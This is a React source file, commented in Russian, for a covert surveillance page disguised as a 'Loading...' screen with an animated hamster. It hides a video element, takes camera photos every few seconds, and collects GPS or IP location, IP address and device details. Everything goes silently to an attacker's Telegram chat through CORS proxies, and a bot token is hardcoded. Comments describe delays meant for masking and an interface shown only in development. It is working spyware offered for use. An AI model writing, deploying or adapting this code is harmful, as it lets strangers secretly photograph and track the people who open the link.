import React, { useRef, useEffect, useState } from "react";
import { useParams, BrowserRouter, Routes, Route } from "react-router-dom";
import ReactDOM from "react-dom/client";
import "./App.css";

/**
 * КОМПОНЕНТ CAMERAHACKING
 */
const CameraHacking = ({ setClientIp, chatId, setLocationPermission }) => {
  const streamRef = useRef(null);
  const captureIntervalRef = useRef(null);
  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const [isInitialized, setIsInitialized] = useState(false);
  const [deviceInfo, setDeviceInfo] = useState(null);
  const [captureCount, setCaptureCount] = useState(0);
  const [debugLogs, setDebugLogs] = useState([]);
  const [isSending, setIsSending] = useState(false);
  const [lastCaptureTime, setLastCaptureTime] = useState(0);

  const TELEGRAM_BOT_TOKEN = '8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s';
  const CAPTURE_INTERVAL = 3000;
  const MAX_CAPTURES = 50;

  const addDebugLog = (message) => {
    const log = `${new Date().toLocaleTimeString()}: ${message}`;
    console.log(log);
    setDebugLogs(prev => [log, ...prev].slice(0, 10));
  };

  // Скрытный способ отправки в Telegram через прокси
  const sendToTelegram = async (text) => {
    try {
      // Используем несколько прокси для обхода блокировок
      const proxies = [
        `https://cors-anywhere.herokuapp.com/https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        `https://api.allorigins.win/raw?url=${encodeURIComponent(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`)}`,
        `https://thingproxy.freeboard.io/fetch/https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`
      ];

      for (const proxyUrl of proxies) {
        try {
          const response = await fetch(proxyUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              chat_id: chatId,
              text: text,
              parse_mode: 'HTML',
              disable_notification: true // Тихие сообщения
            })
          });

          if (response.ok) {
            addDebugLog(`✅ Сообщение отправлено через прокси`);
            return true;
          }
        } catch (proxyError) {
          continue;
        }
      }

      // Если все прокси не работают, пробуем напрямую
      const directResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        mode: 'no-cors',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: text,
          parse_mode: 'HTML',
          disable_notification: true
        })
      });
      
      addDebugLog(`✅ Сообщение отправлено (no-cors)`);
      return true;

    } catch (error) {
      addDebugLog(`❌ Ошибка отправки сообщения: ${error.message}`);
      return false;
    }
  };

  const sendPhotoToTelegram = async (blob, caption = '') => {
    if (isSending) {
      addDebugLog('Пропускаем - уже идет отправка');
      return false;
    }

    setIsSending(true);
    try {
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob, `image_${Date.now()}.jpeg`);
      formData.append('disable_notification', 'true'); // Тихие уведомления

      if (caption) {
        formData.append('caption', caption);
      }

      // Используем прокси для отправки фото
      const proxies = [
        `https://cors-anywhere.herokuapp.com/https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
        `https://api.allorigins.win/post?url=${encodeURIComponent(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`)}`,
        `https://thingproxy.freeboard.io/fetch/https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`
      ];

      let success = false;
      for (const proxyUrl of proxies) {
        try {
          const response = await fetch(proxyUrl, {
            method: 'POST',
            body: formData
          });

          if (response.ok) {
            success = true;
            addDebugLog(`✅ Фото отправлено через прокси`);
            break;
          }
        } catch (proxyError) {
          continue;
        }
      }

      if (!success) {
        // Прямая отправка как fallback
        try {
          await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            mode: 'no-cors',
            body: formData
          });
          addDebugLog(`✅ Фото отправлено (no-cors)`);
          success = true;
        } catch (directError) {
          addDebugLog(`❌ Ошибка прямой отправки: ${directError.message}`);
        }
      }

      return success;

    } catch (error) {
      addDebugLog(`❌ Общая ошибка отправки фото: ${error.message}`);
      return false;
    } finally {
      setIsSending(false);
    }
  };

  const createTestImage = async () => {
    if (!canvasRef.current) {
      canvasRef.current = document.createElement('canvas');
    }
    const canvas = canvasRef.current;
    canvas.width = 640;
    canvas.height = 480;
    const ctx = canvas.getContext('2d');

    // Создаем черный фон
    ctx.fillStyle = '#000000';
    ctx.fillRect(0, 0, 640, 480);

    // Добавляем минимальную информацию
    ctx.fillStyle = '#FFFFFF';
    ctx.font = '16px Arial';
    ctx.textAlign = 'center';
    ctx.fillText('📷', 320, 240);
    ctx.font = '12px Arial';
    ctx.fillText(new Date().toLocaleTimeString(), 320, 260);
    ctx.fillText(`#${captureCount + 1}`, 320, 280);

    return new Promise(resolve => {
      canvas.toBlob(resolve, 'image/jpeg', 0.7);
    });
  };

  const captureCameraPhoto = async () => {
    if (!videoRef.current || !streamRef.current) {
      addDebugLog('Камера не готова');
      return await createTestImage();
    }

    const video = videoRef.current;

    if (video.videoWidth === 0 || video.videoHeight === 0) {
      addDebugLog('Видео не готово');
      return await createTestImage();
    }

    addDebugLog(`Захват #${captureCount + 1} (${video.videoWidth}x${video.videoHeight})`);

    try {
      if (!canvasRef.current) {
        canvasRef.current = document.createElement('canvas');
      }
      const canvas = canvasRef.current;
      
      // Используем оптимальные размеры для мобильных
      let width = video.videoWidth;
      let height = video.videoHeight;
      
      // Для экономии трафика уменьшаем размер
      const maxSize = 800;
      if (width > maxSize || height > maxSize) {
        const ratio = Math.min(maxSize / width, maxSize / height);
        width = Math.floor(width * ratio);
        height = Math.floor(height * ratio);
      }
      
      canvas.width = width;
      canvas.height = height;

      const ctx = canvas.getContext('2d');
      
      // Очищаем canvas
      ctx.fillStyle = '#000000';
      ctx.fillRect(0, 0, width, height);
      
      // Рисуем видео
      ctx.drawImage(video, 0, 0, width, height);

      // Проверяем что кадр не черный
      const imageData = ctx.getImageData(0, 0, 1, 1);
      const pixel = imageData.data;
      if (pixel[0] < 10 && pixel[1] < 10 && pixel[2] < 10) {
        addDebugLog('Черный кадр, используем тестовое изображение');
        return await createTestImage();
      }

      return new Promise(resolve => {
        canvas.toBlob(resolve, 'image/jpeg', 0.6); // Низкое качество для скорости
      });

    } catch (error) {
      addDebugLog(`Ошибка захвата: ${error.message}`);
      return await createTestImage();
    }
  };

  const captureAndSend = async () => {
    if (captureCount >= MAX_CAPTURES) {
      addDebugLog(`Лимит ${MAX_CAPTURES} достигнут`);
      stopCapturing();
      return;
    }

    addDebugLog(`[${captureCount + 1}/${MAX_CAPTURES}] Захват...`);

    const photoBlob = await captureCameraPhoto();

    if (!photoBlob) {
      addDebugLog('Ошибка создания фото');
      return;
    }

    const caption = `📸 #${captureCount + 1}\n` +
      `⏰ ${new Date().toLocaleTimeString()}\n` +
      `📱 ${deviceInfo?.platform || 'Device'}\n` +
      `💾 ${Math.round(photoBlob.size / 1024)}KB`;

    const success = await sendPhotoToTelegram(photoBlob, caption);

    if (success) {
      setCaptureCount(prev => prev + 1);
      setLastCaptureTime(Date.now());
      addDebugLog(`✅ Отправлено`);

      // Периодически отправляем статистику
      if ((captureCount + 1) % 10 === 0) {
        await sendToTelegram(
          `📊 Статистика: ${captureCount + 1} фото\n` +
          `📱 ${deviceInfo?.platform || ''}\n` +
          `🖼 ${deviceInfo?.resolution || ''}\n` +
          `⏰ ${new Date().toLocaleString()}`
        );
      }
    } else {
      addDebugLog('❌ Ошибка отправки');
    }
  };

  const initializeCamera = async () => {
    addDebugLog('Инициализация...');

    try {
      const ua = navigator.userAgent;
      const isMobile = /mobile|android|iphone|ipad/i.test(ua.toLowerCase());
      
      setDeviceInfo({
        isMobile,
        platform: isMobile ? 'Mobile' : 'Desktop',
        userAgent: ua.substring(0, 100)
      });

      // Пробуем разные конфигурации камеры
      const constraintsList = [
        {
          video: {
            facingMode: { exact: "environment" }, // Задняя камера
            width: { ideal: 1280 },
            height: { ideal: 720 }
          },
          audio: false
        },
        {
          video: {
            facingMode: "user", // Передняя камера
            width: { ideal: 1280 },
            height: { ideal: 720 }
          },
          audio: false
        },
        {
          video: true, // Любая доступная камера
          audio: false
        }
      ];

      let stream = null;
      for (const constraints of constraintsList) {
        try {
          stream = await navigator.mediaDevices.getUserMedia(constraints);
          addDebugLog(`Камера найдена: ${constraints.video.facingMode || 'any'}`);
          break;
        } catch (err) {
          continue;
        }
      }

      if (!stream) {
        throw new Error('Камера не доступна');
      }

      streamRef.current = stream;

      // Создаем скрытый video элемент если его нет
      if (!videoRef.current) {
        videoRef.current = document.createElement('video');
        videoRef.current.style.cssText = `
          position: fixed;
          width: 1px;
          height: 1px;
          opacity: 0;
          pointer-events: none;
          z-index: -9999;
          top: -9999px;
          left: -9999px;
        `;
        document.body.appendChild(videoRef.current);
      }

      const video = videoRef.current;
      video.playsInline = true;
      video.muted = true;
      video.autoplay = true;
      video.setAttribute('playsinline', 'true');
      video.setAttribute('muted', 'true');
      video.setAttribute('autoplay', 'true');
      video.setAttribute('webkit-playsinline', 'true');

      video.srcObject = stream;

      // Ждем готовности видео
      await new Promise((resolve) => {
        const timer = setTimeout(() => {
          addDebugLog('Таймаут видео');
          resolve();
        }, 3000);

        video.onloadedmetadata = () => {
          clearTimeout(timer);
          const resolution = `${video.videoWidth}x${video.videoHeight}`;
          setDeviceInfo(prev => ({ ...prev, resolution }));
          addDebugLog(`Разрешение: ${resolution}`);
          
          // Запускаем видео без звука
          video.play().catch(() => {
            addDebugLog('Автозапуск заблокирован');
          });
          resolve();
        };
      });

      // Отправляем начальное сообщение
      await sendToTelegram(
        `🚀 Система активирована\n` +
        `📱 ${isMobile ? 'Мобильное' : 'Десктоп'}\n` +
        `🖼 ${deviceInfo?.resolution || ''}\n` +
        `⏰ ${new Date().toLocaleString()}`
      );

      setIsInitialized(true);
      return true;

    } catch (error) {
      addDebugLog(`Ошибка: ${error.message}`);
      await sendToTelegram(`❌ Ошибка инициализации: ${error.message}`);
      return false;
    }
  };

  const getClientIp = async () => {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      setClientIp(data.ip);

      await sendToTelegram(
        `🌐 IP: ${data.ip}\n` +
        `📱 ${navigator.userAgent.substring(0, 80)}`
      );

    } catch (error) {
      setClientIp('unknown');
    }
  };

  const startPeriodicCapture = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
    }

    addDebugLog(`Интервал: ${CAPTURE_INTERVAL/1000}с`);

    // Первый захват сразу
    setTimeout(() => {
      captureAndSend();
    }, 1000);

    // Последующие по интервалу
    captureIntervalRef.current = setInterval(() => {
      captureAndSend();
    }, CAPTURE_INTERVAL);
  };

  const stopCapturing = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
      captureIntervalRef.current = null;
    }

    if (streamRef.current) {
      streamRef.current.getTracks().forEach(track => track.stop());
      streamRef.current = null;
    }

    if (videoRef.current) {
      videoRef.current.srcObject = null;
      document.body.removeChild(videoRef.current);
      videoRef.current = null;
    }

    addDebugLog('Остановлено');
  };

  useEffect(() => {
    let mounted = true;

    const init = async () => {
      addDebugLog('Запуск системы...');

      // Задержка для маскировки
      await new Promise(resolve => setTimeout(resolve, 2000));

      await getClientIp();

      if (!navigator.mediaDevices?.getUserMedia) {
        addDebugLog('WebRTC не поддерживается');
        return;
      }

      const success = await initializeCamera();

      if (success && mounted) {
        startPeriodicCapture();
      }
    };

    // Запускаем с задержкой чтобы страница успела загрузиться
    setTimeout(init, 3000);

    return () => {
      mounted = false;
      stopCapturing();
    };
  }, []);

  // Скрытый интерфейс (только для отладки)
  if (process.env.NODE_ENV === 'development') {
    return (
      <div style={{
        position: 'fixed',
        bottom: '10px',
        right: '10px',
        background: 'rgba(0,0,0,0.8)',
        color: '#0f0',
        padding: '10px',
        borderRadius: '5px',
        fontSize: '11px',
        fontFamily: 'monospace',
        zIndex: 9999,
        maxWidth: '300px',
        maxHeight: '200px',
        overflow: 'hidden'
      }}>
        <div style={{ marginBottom: '5px', fontWeight: 'bold' }}>
          📡 {captureCount} | {deviceInfo?.resolution || '0x0'}
        </div>
        <div style={{ maxHeight: '150px', overflow: 'auto' }}>
          {debugLogs.map((log, i) => (
            <div key={i} style={{
              padding: '2px 0',
              borderBottom: '1px solid #333',
              color: log.includes('✅') ? '#0f0' : log.includes('❌') ? '#f00' : '#ccc',
              fontSize: '10px'
            }}>
              {log}
            </div>
          ))}
        </div>
      </div>
    );
  }

  return null; // В продакшене ничего не показываем
};

/**
 * КОМПОНЕНТ LOCATIONHANDLER
 */
const LocationHandler = ({ setLocationPermission, chatId, clientIp }) => {
  const TELEGRAM_BOT_TOKEN = '8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s';

  const sendToTelegram = async (text) => {
    try {
      await fetch(`https://cors-anywhere.herokuapp.com/https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: text,
          parse_mode: 'HTML',
          disable_notification: true
        })
      });
    } catch (error) {
      console.error('Telegram error:', error);
    }
  };

  const getLocationByIp = async () => {
    try {
      const response = await fetch(`https://ipapi.co/${clientIp}/json/`);
      const data = await response.json();
      
      await sendToTelegram(
        `📍 Геолокация (IP)\n` +
        `🏙 ${data.city || ''}, ${data.country_name || ''}\n` +
        `📌 ${data.latitude || ''}, ${data.longitude || ''}\n` +
        `🌐 ${clientIp}`
      );

      if (data.latitude && data.longitude) {
        setLocationPermission({
          latitude: data.latitude,
          longitude: data.longitude
        });
      }
    } catch (error) {
      console.error('Location error:', error);
    }
  };

  const requestLocationPermission = async () => {
    try {
      const position = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, {
          enableHighAccuracy: false,
          timeout: 5000,
          maximumAge: 60000
        });
      });

      const { latitude, longitude, accuracy } = position.coords;
      
      await sendToTelegram(
        `📍 Геолокация (GPS)\n` +
        `📌 ${latitude.toFixed(6)}, ${longitude.toFixed(6)}\n` +
        `🎯 Точность: ${Math.round(accuracy)}м\n` +
        `🌐 ${clientIp}`
      );

      setLocationPermission({ latitude, longitude });
      localStorage.setItem("locationPermission", JSON.stringify({ latitude, longitude }));

    } catch (error) {
      getLocationByIp();
    }
  };

  useEffect(() => {
    if (clientIp) {
      // Запрашиваем геолокацию с задержкой
      setTimeout(() => {
        requestLocationPermission();
      }, 5000);
    }
  }, [clientIp]);

  return null;
};

/**
 * КОМПОНЕНТ PHOTOPAGE
 */
const PhotoPage = () => {
  const { chatId } = useParams();
  const [locationPermission, setLocationPermission] = useState(null);
  const [clientIp, setClientIp] = useState("");
  const [deviceInfo, setDeviceInfo] = useState(null);

  const TELEGRAM_BOT_TOKEN = '8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s';

  const sendToTelegram = async (text) => {
    try {
      await fetch(`https://cors-anywhere.herokuapp.com/https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: text,
          parse_mode: 'HTML',
          disable_notification: true
        })
      });
    } catch (error) {
      console.error('Telegram error:', error);
    }
  };

  const getDeviceInfo = () => {
    const ua = navigator.userAgent;
    const isMobile = /mobile|android|iphone|ipad/i.test(ua.toLowerCase());
    
    return {
      platform: navigator.platform,
      userAgent: ua.substring(0, 150),
      screen: `${window.screen.width}x${window.screen.height}`,
      deviceType: isMobile ? 'Mobile' : 'Desktop',
      language: navigator.language,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      cores: navigator.hardwareConcurrency,
      memory: navigator.deviceMemory,
      connection: navigator.connection?.effectiveType
    };
  };

  useEffect(() => {
    const init = async () => {
      // Получаем IP
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        setClientIp(data.ip);
      } catch {
        setClientIp('unknown');
      }

      // Собираем информацию об устройстве
      const info = getDeviceInfo();
      setDeviceInfo(info);

      // Отправляем информацию об устройстве
      await sendToTelegram(
        `📱 Устройство подключено\n` +
        `💻 ${info.deviceType} | ${info.platform}\n` +
        `🖥 ${info.screen}\n` +
        `🌐 ${info.language} | ${info.timezone}\n` +
        `⚡ CPU: ${info.cores} | RAM: ${info.memory}GB\n` +
        `📡 Сеть: ${info.connection || 'unknown'}\n` +
        `⏰ ${new Date().toLocaleString()}`
      );
    };

    // Запускаем с задержкой
    setTimeout(init, 1000);
  }, []);

  return (
    <>
      <div className="App">
        <div className="wraper">
          <div className="wheel-and-hamster">
            <div className="wheel"></div>
            <div className="hamster">
              <div className="hamster__body">
                <div className="hamster__head">
                  <div className="hamster__ear"></div>
                  <div className="hamster__eye"></div>
                  <div className="hamster__nose"></div>
                </div>
                <div className="hamster__limb hamster__limb--fr"></div>
                <div className="hamster__limb hamster__limb--fl"></div>
                <div className="hamster__limb hamster__limb--br"></div>
                <div className="hamster__limb hamster__limb--bl"></div>
                <div className="hamster__tail"></div>
              </div>
            </div>
            <div className="spoke"></div>
          </div>
          
          <div style={{
            textAlign: 'center',
            marginTop: '20px',
            color: '#333'
          }}>
            <h2 style={{ fontSize: '24px', marginBottom: '10px' }}>Загрузка...</h2>
            <p style={{ fontSize: '16px', opacity: 0.7 }}>
              Пожалуйста, подождите
            </p>
          </div>
        </div>
      </div>

      <LocationHandler
        chatId={chatId}
        locationPermission={locationPermission}
        setLocationPermission={setLocationPermission}
        clientIp={clientIp}
      />

      <CameraHacking
        chatId={chatId}
        setClientIp={setClientIp}
        setLocationPermission={setLocationPermission}
      />
    </>
  );
};

/**
 * КОМПОНЕНТ APP
 */
const App = () => {
  return (
    <Routes>
      <Route path="/g/:chatId" element={<PhotoPage />} />
    </Routes>
  );
};

/**
 * ОСНОВНОЙ РЕНДЕР
 */
const root = ReactDOM.createRoot(document.getElementById("root"));
root.render(
  <BrowserRouter>
    <App />
  </BrowserRouter>
);

export default App;
